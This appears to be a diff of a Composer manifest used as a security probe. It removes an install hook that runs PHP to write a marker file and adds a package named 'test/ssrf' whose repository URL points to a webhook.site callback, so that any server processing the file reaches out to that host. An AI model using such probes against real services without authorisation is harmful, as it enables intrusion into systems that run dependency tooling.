@@ -1,7 +1,10 @@
 {
-  "scripts": {
-    "post-install-cmd": [
-      "@php -r \"file_put_contents('composer-script-ran.txt','executed');\""
-    ]
-  }
+    "name": "test/ssrf",
+    "repositories": [
+        {
+            "type": "composer",
+            "url": " https://webhook.site/4f312a36-3a03-4f31-ac36-d8973f1855d9"
+        }
+    ],
+    "require": {}
 }
